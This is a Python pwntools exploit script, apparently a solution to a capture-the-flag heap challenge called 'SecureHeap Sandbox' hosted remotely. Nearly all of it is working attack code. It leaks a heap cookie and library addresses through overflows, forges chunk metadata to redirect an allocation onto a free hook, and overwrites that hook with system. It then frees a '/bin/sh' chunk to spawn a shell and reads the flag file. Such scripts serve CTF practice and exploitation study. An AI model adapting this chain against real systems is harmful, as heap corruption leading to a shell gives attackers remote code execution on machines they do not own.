from pwn import *

def alloc(size):
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"Size: ", str(size).encode())
    p.recvuntil(b"Index: ")
    chunk_id = int(p.recvline().strip())
    return chunk_id

def delete(chunk_id):
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"Index: ", str(chunk_id).encode())

def edit(chunk_id, data):
    p.sendlineafter(b"> ", b"3")
    p.sendlineafter(b"Index: ", str(chunk_id).encode())
    p.sendlineafter(b"Data: ", data)

def show(chunk_id):
    p.sendlineafter(b"> ", b"4")
    p.sendlineafter(b"Index: ", str(chunk_id).encode())
    data = p.recvuntil(b"\n==========SecureHeap Sandbox==========", drop=True)
    return data


##########
guard_tail_to_mmap_base_off = 0x1f9120
mmap_base_to_libc_off = 0x3000
mmap_base_to_libheap_off = 0x1f5000
system_off = 0x000000000052290
xfree_hook_off = 0x4168
##########

# p = process("./sandbox", env={"LD_LIBRARY_PATH": "."})
p = remote("kitctf.me", 4269)



alloc(0x10)

chunk_id = alloc(0x1000)

alloc(0x10)
alloc(0x10)

for _ in range(0, (0x10000 // 0x4000) - 1):
    alloc(0x4000)
alloc(0x2e08 + 0x10) # new 0

delete(chunk_id)

edit(0, b"A"*0x20)
edit(2, b"A"*0x20)

alloc(0x10)
chunk_id = alloc(0x10)
alloc(0x10)

"""
0x31337000: 0x4af10fe079ae0a00  0x00000021deadbeef
0x31337010: 0x0000000031337048  0x0000000000000000
0x31337020: 0x0000000000000000  0x4141414141414141
0x31337030: 0x4141414141414141  0x4141414141414141
0x31337040: 0x4141414141414141  0x60f92cce1ca5e400
0x31337050: 0x00001010deadbeef  0x0000000031338080
0x31337060: 0x00007f6739f33120  0x00007f6739f330e0
"""

leaked_cookie = u64(show(2)[0x20:0x20+8].ljust(8, b"\x00")) & ~0xff
print(f"cookie @ {hex(leaked_cookie)}")

edit(0, b"A"*(0x20 + 8*3 - 1))

leaked_guard_tail = u64(show(0)[0x20+8*3:0x20+8*4].ljust(8, b"\x00"))
mmap_base = leaked_guard_tail - guard_tail_to_mmap_base_off
libc_base = mmap_base + mmap_base_to_libc_off
libheap_base = mmap_base + mmap_base_to_libheap_off
system = libc_base + system_off
xfree_hook = libheap_base + xfree_hook_off

print(f"guard_tail @ {hex(leaked_guard_tail)}")
print(f"mmap base @ {hex(mmap_base)}")
print(f"libc @ {hex(libc_base)}")
print(f"libsecureheap @ {hex(libheap_base)}")

binsh_chunk = alloc(0x10)
edit(binsh_chunk, b"/bin/sh\x00")

"""
0x313380c8: 0x516d0b70336b2f0a  0x00000020deadbeef
0x313380d8: 0x0000000031338110  0x0000000000000000
0x313380e8: 0x0000000000000000  
"""
delete(chunk_id + 1)
edit(chunk_id, b"A"*0x20 + p64(leaked_cookie) + p64(0x00000020deadbeef) + p64(0x0000000031338110) + p64(xfree_hook - 8*5) + p64(0) + b"B"*8)

alloc(0x10)

chunk_id = alloc(0x10)
edit(chunk_id, p64(system))

delete(binsh_chunk)

p.sendline(b"cat flag.txt")

p.interactive()